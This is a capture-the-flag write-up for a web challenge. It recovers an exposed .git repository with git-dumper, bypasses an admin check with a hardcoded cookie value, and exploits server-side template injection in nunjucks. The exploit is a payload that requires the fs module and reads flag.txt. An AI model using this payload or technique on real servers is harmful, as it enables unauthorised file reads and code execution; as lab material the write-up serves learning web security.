# DeconstruCT.F 2023

## gitcha

> Simon is maintaining a personal portfolio website, along with a secret which no one else knows.
>
> Can you discover his secret?
>
>  Author: N/A
>

Tags: _web_

## Solution
Another web application is given. Browsing the code a comment stands out:

```html
<!-- John, don't forget to take the .git route down, we don't need it anymore -->
```

So there seems to be a `.git` route. Indeed there is and it exposes a git repository. The repository can be cloned with `git-dumper`.

```bash
git-dumper https://ch28770128711.ch.eng.run/ repo
```

The main part of the app is in `index.js`. There is the already known `/.git` route also `/robots.txt` that exposes another route `/supersecret` but thats no much use since we already have the code.

`supersecret` is interesting as it exposes functionality to admin only. The admin check itself is trivial, a cookie `SECRET_COOKIE_VALUE` needs to be set to the value `thisisahugesecret`, so we do this in our browser. Now we are admin, feels great.

Then there is some functionality to create and view `notes`. `/addnote` adds a note to a database and `/getnotedetails` renders note details, again only for admin. The interesting bit is, in neither `addnote` or `getnotedetails` there is any sanitation done to the user input. This strongly smells like `SSTI`. To check this out we can enter something like `{{8*8}}` as comment and check the details. And indeed, the details show `64`. The template engine is [`nunjucks`](https://mozilla.github.io/nunjucks/) so we can look for fitting [`payloads`](https://github.com/geeknik/the-nuclei-templates/blob/main/node-nunjucks-ssti.yaml), [`here`](https://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine) or [`here`](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection). 

```js
const express = require("express");
const fs = require("fs");
const serveIndex = require("serve-index");
const cookieParser = require("cookie-parser");
const nunjucks = require("nunjucks");
const bodyParser = require("body-parser");

const { PrismaClient } = require("@prisma/client");
const prisma = new PrismaClient();

const app = express();

const checkAdmin = (req, res) => {
  if (req.cookies["SECRET_COOKIE_VALUE"] === "thisisahugesecret") {
    return true;
  }
  return false;
};

nunjucks.configure("views", {
  autoescape: true,
  express: app,
});

app.use(cookieParser());
app.use(express.static("public"));
app.use(bodyParser.urlencoded({ extended: true }));

app.use("/.git", express.static(".git/"), serveIndex(".git/", { icons: true }));

app.get("/robots.txt", (req, res) => {
  res.type("text/plain");
  res.send("User-agent: *\nDisallow: /.git/\nDisallow: /supersecret/");
});

app.get("/supersecret", async (req, res) => {
  if (checkAdmin(req, res)) {
    const results = await prisma.note.findMany();
    res.render("notes.html", { foo: "bar", notes: results });
  } else {
    res.redirect("/");
  }
});

app.get("/getnotedetails", async (req, res) => {
  if (checkAdmin(req, res)) {
    const { id } = req.query;
    const note = await prisma.note.findUnique({ where: { id: parseInt(id) } });
    res.send(
      nunjucks.renderString(`
      <div style="margin: 15px;">
        <h1 style="font-family: Roboto;">${note.title}</h1>
        <p>${note.content}</p>
      </div>
  `)
    );
  } else {
    res.redirect("/");
  }
});

app.post("/addnote", async (req, res) => {
  if (checkAdmin(req, res)) {
    await prisma.note.create({
      data: {
        title: req.body.title,
        content: req.body.content,
      },
    });
    res.status(200).send("Note added");
  } else {
    res.status(403).send("Forbidden");
  }
});

app.get("/viewsource", (req, res) => {
  if (checkAdmin(req, res)) {
    const data = fs.readFileSync("index.js", "utf8");
    res.type("text/javascript");
    res.send(`
        ${data}
    `);
  }
});

app.listen(8080, () => {
  console.log("Example app listening on port 8080!");
});
```

After some trial and error (and some server crashes) the following payload gave the flag.

```js
{{range.constructor("return global.process.mainModule.require('fs').readFileSync('flag.txt')")()}}
```

Flag `dsc{g1t_enum3r4ti0n_4nD_sSt1}`